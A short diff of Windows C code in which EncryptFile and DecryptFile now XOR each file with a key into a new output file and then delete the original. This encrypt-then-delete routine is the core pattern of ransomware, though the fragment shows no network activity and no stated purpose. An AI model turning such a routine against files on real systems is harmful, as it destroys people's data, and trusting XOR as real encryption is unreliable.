@@ -30,7 +30,7 @@ BOOL EncryptFile(LPTSTR lpFileName, LPVOID EncKey) {
     if(length_of_arg <= (MAX_PATH - 3)) {
         _tprintf(_T("Encoding %s \n"), lpFileName);
         // printf("%lu", GetFileAttributes(_T("C:\\Users\\Mata\\Desktop\\wget.txt")));
-        if(CopyFile(lpFileName, szOutputFile, TRUE)) { // Encrypt function here
+        if(XORFile(lpFileName, szOutputFile, EncKey)) { // Encrypt function here
             if(DeleteFile(lpFileName)) {
                 return TRUE;
             }
@@ -48,7 +48,7 @@ BOOL DecryptFile(LPTSTR lpFileName, LPVOID DecKey) {
         *ptr = '\0';
         _tprintf(_T("Decoding %s\n"), szOutputFile);
     }
-    if(CopyFile(lpFileName, szOutputFile, TRUE)) { // Encrypt function here
+    if(XORFile(lpFileName, szOutputFile, DecKey)) { // Encrypt function here
         if(DeleteFile(lpFileName)) {
             return TRUE;
         }
